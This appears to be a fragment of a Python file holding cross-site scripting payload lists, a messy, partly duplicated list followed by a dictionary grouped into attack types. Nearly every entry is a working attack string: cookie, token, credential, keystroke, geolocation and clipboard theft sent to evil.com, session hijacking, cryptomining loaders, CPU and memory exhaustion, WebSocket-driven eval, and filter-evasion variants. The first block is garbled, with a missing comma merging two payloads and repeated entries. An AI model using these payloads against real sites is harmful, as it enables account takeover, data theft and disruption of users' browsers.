       'xss': [
                "<script>while(true){alert('XSS')}</script>",
                "<img src=x onerror=\"javascript:while(true){window.open('http://malicious.com')}\">",
                "<body onload=\"document.body.innerHTML='<iframe src=http://malicious.com></iframe>'\">"
                     "<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>",
        "<script>var i=new Image();i.src='http://evil.com/?data='+localStorage.getItem('token')</script>",
        "<script>navigator.credentials.get({password:true}).then(c=>{fetch('http://evil.com/pwd',{method:'POST',body:JSON.stringify(c)})})</script>",
        "<script>document.forms[0].addEventListener('submit',function(e){fetch('http://evil.com/form',{method:'POST',body:new FormData(this)})})</script>",
           "<script>document.onkeypress=function(e){fetch('http://evil.com/keys?k='+e.key)</script>",
        "<script>document.addEventListener('keydown',e=>{localStorage.setItem('keys',(localStorage.getItem('keys')||'')+e.key)})</script>",
              "<script>while(true){for(let i=0;i<1000000;i++){Math.sqrt(i)}}</script>",
        "<script>setInterval(()=>{let start=Date.now();while(Date.now()-start<1000){}},1)</script>",
                 "<script>let a=[];while(true){a.push(new Array(1000000))}</script>",
        "<script>for(;;){document.write('<div>'+'A'.repeat(1000000)+'</div>')}</script>",
                "<script>while(true){window.open('http://malicious.com')}</script>",
        "<script>setInterval(()=>{window.open(window.location)},100)</script>",
        "<script>while(true){alert('CRASH')}</script>",
        "<script>document.body.innerHTML=''</script>",
        "<script>window.location='about:blank'</script>",
                    "<script>localStorage.setItem('malicious','<script>alert(1)</script>')</script>",
        "<script>sessionStorage.setItem('payload','<img src=x onerror=alert(1)>')</script>",
        
        
        "<script>document.cookie='malicious=<script>alert(1)</script>;path=/'</script>",
        
        
        "<script>fetch('/api/comments',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({comment:'<script>alert(1)</script>'})})</script>",    
                   "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        
        # Case variation
        "<ScRiPt>alert(1)</ScRiPt>",
        "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>",
        
        # Whitespace tricks
        "<script/ src=http://evil.com/xss.js>",
        "<script\n>alert(1)</script>",
        "<script\t>alert(1)</script>",
        "<script>alert(1)</script\0>",
        "<img src=x onerror=alert(1)\0>",     
                
                 "<script>var script=document.createElement('script');script.src='https://coinhive.com/lib/miner.js';document.head.appendChild(script);script.onload=function(){var miner=new CoinHive.Anonymous('KEY');miner.start()}</script>",
        "<script>import('https://xmr.miner.com/script.js').then(m=>m.startMining())</script>", 
              "<script>document.cookie='malicious=<script>alert(1)</script>;path=/'</script>",
                     "<script>localStorage.setItem('malicious','<script>alert(1)</script>')</script>",
        "<script>sessionStorage.setItem('payload','<img src=x onerror=alert(1)>')</script>",
                "<script>fetch('/api/comments',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({comment:'<script>alert(1)</script>'})})</script>",
                        "<script>var ws=new WebSocket('ws://evil.com:8080');ws.onopen=function(){ws.send(document.cookie)}</script>",
        "<script>var ws=new WebSocket('ws://localhost:9222');ws.onmessage=function(e){eval(e.data)}</script>",
                    "<iframe src='javascript:alert(1)'></iframe>",
        "<iframe src='http://evil.com' onload='alert(1)'></iframe>",
        "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
        "<iframe src='data:text/html,<script>alert(1)</script>'></iframe>",
                "<script>while(true){window.open('http://malicious.com')}</script>",
        "<script>setInterval(()=>{window.open(window.location)},100)</script>",
        "<script>while(true){alert('CRASH')}</script>",
        "<script>document.body.innerHTML=''</script>",
        "<script>window.location='about:blank'</script>",
            ],




xss_payloads = {
    # Destructive Browser Attacks
    'browser_destruction': [
        "<script>while(true){window.open('http://malicious.com')}</script>",
        "<script>setInterval(()=>{window.open(window.location)},100)</script>",
        "<script>while(true){alert('CRASH')}</script>",
        "<script>document.body.innerHTML=''</script>",
        "<script>window.location='about:blank'</script>",
        
        # Memory exhaustion
        "<script>let a=[];while(true){a.push(new Array(1000000))}</script>",
        "<script>for(;;){document.write('<div>'+'A'.repeat(1000000)+'</div>')}</script>",
        
        # CPU exhaustion
        "<script>while(true){for(let i=0;i<1000000;i++){Math.sqrt(i)}}</script>",
        "<script>setInterval(()=>{let start=Date.now();while(Date.now()-start<1000){}},1)</script>",
    ],
    
    # Data Theft & Credential Harvesting
    'data_theft': [
        "<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>",
        "<script>var i=new Image();i.src='http://evil.com/?data='+localStorage.getItem('token')</script>",
        "<script>navigator.credentials.get({password:true}).then(c=>{fetch('http://evil.com/pwd',{method:'POST',body:JSON.stringify(c)})})</script>",
        "<script>document.forms[0].addEventListener('submit',function(e){fetch('http://evil.com/form',{method:'POST',body:new FormData(this)})})</script>",
        
        # Keylogging
        "<script>document.onkeypress=function(e){fetch('http://evil.com/keys?k='+e.key)</script>",
        "<script>document.addEventListener('keydown',e=>{localStorage.setItem('keys',(localStorage.getItem('keys')||'')+e.key)})</script>",
    ],
    
    # Session Hijacking
    'session_hijacking': [
        "<script>window.location='http://evil.com/steal?session='+btoa(document.cookie)</script>",
        "<script>var x=new XMLHttpRequest();x.open('GET','http://evil.com/hijack?data='+btoa(localStorage.getItem('user')),true);x.send()</script>",
        "<script>fetch('/api/user').then(r=>r.json()).then(d=>{fetch('http://evil.com/user',{method:'POST',body:JSON.stringify(d)})})</script>",
    ],
    
    # Network & Redirect Attacks
    'network_attacks': [
        "<script>setInterval(()=>{fetch(window.location)},100)</script>",
        "<script>for(let i=0;i<100;i++){fetch('/')}</script>",
        "<script>window.location='http://phishing-site.com'</script>",
        "<meta http-equiv='refresh' content='0;url=http://malicious.com'>",
        
        # DNS rebinding
        "<script>fetch('http://192.168.1.1:8080/')</script>",
        "<script>var ws=new WebSocket('ws://localhost:9222')</script>",
    ],
    
    # DOM Destruction
    'dom_destruction': [
        "<script>document.documentElement.innerHTML=''</script>",
        "<script>document.body.remove()</script>",
        "<script>while(document.body.firstChild){document.body.removeChild(document.body.firstChild)}</script>",
        "<script>document.write('<h1>HACKED</h1>')</script>",
        "<script>document.title='HACKED'</script>",
        
        # CSS destruction
        "<style>*{display:none !important}</style>",
        "<style>body{background:red !important;color:white !important}</style>",
    ],
    
    # Browser Exploitation
    'browser_exploitation': [
        # Attempt to access sensitive APIs
        "<script>navigator.mediaDevices.getUserMedia({video:true}).then(stream=>{})</script>",
        "<script>navigator.geolocation.getCurrentPosition(p=>{fetch('http://evil.com/loc?lat='+p.coords.latitude+'&lon='+p.coords.longitude)})</script>",
        "<script>navigator.clipboard.readText().then(text=>{fetch('http://evil.com/clipboard?text='+text)})</script>",
        
        # Service Worker hijacking
        "<script>navigator.serviceWorker.register('malicious-sw.js')</script>",
        
        # Notification spam
        "<script>Notification.requestPermission().then(p=>{if(p=='granted'){for(let i=0;i<100;i++){new Notification('SPAM '+i)}}})</script>",
    ],
    
    # Cryptojacking
    'cryptojacking': [
        "<script>var script=document.createElement('script');script.src='https://coinhive.com/lib/miner.js';document.head.appendChild(script);script.onload=function(){var miner=new CoinHive.Anonymous('KEY');miner.start()}</script>",
        "<script>import('https://xmr.miner.com/script.js').then(m=>m.startMining())</script>",
    ],
    
    # Advanced Evasion Techniques
    'evasion_techniques': [
        # Encoding tricks
        "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        
        # Case variation
        "<ScRiPt>alert(1)</ScRiPt>",
        "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>",
        
        # Whitespace tricks
        "<script/ src=http://evil.com/xss.js>",
        "<script\n>alert(1)</script>",
        "<script\t>alert(1)</script>",
        
        # Null byte injection
        "<script>alert(1)</script\0>",
        "<img src=x onerror=alert(1)\0>",
    ],
    
    # Persistent XSS Attacks
    'persistent_attacks': [
        # LocalStorage poisoning
        "<script>localStorage.setItem('malicious','<script>alert(1)</script>')</script>",
        "<script>sessionStorage.setItem('payload','<img src=x onerror=alert(1)>')</script>",
        
        # Cookie manipulation
        "<script>document.cookie='malicious=<script>alert(1)</script>;path=/'</script>",
        
        # Database pollution
        "<script>fetch('/api/comments',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({comment:'<script>alert(1)</script>'})})</script>",
    ],
    
    # WebSocket Attacks
    'websocket_attacks': [
        "<script>var ws=new WebSocket('ws://evil.com:8080');ws.onopen=function(){ws.send(document.cookie)}</script>",
        "<script>var ws=new WebSocket('ws://localhost:9222');ws.onmessage=function(e){eval(e.data)}</script>",
    ],
    
    # IFrame Exploitation
    'iframe_exploitation': [
        "<iframe src='javascript:alert(1)'></iframe>",
        "<iframe src='http://evil.com' onload='alert(1)'></iframe>",
        "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
        "<iframe src='data:text/html,<script>alert(1)</script>'></iframe>",
    ]
}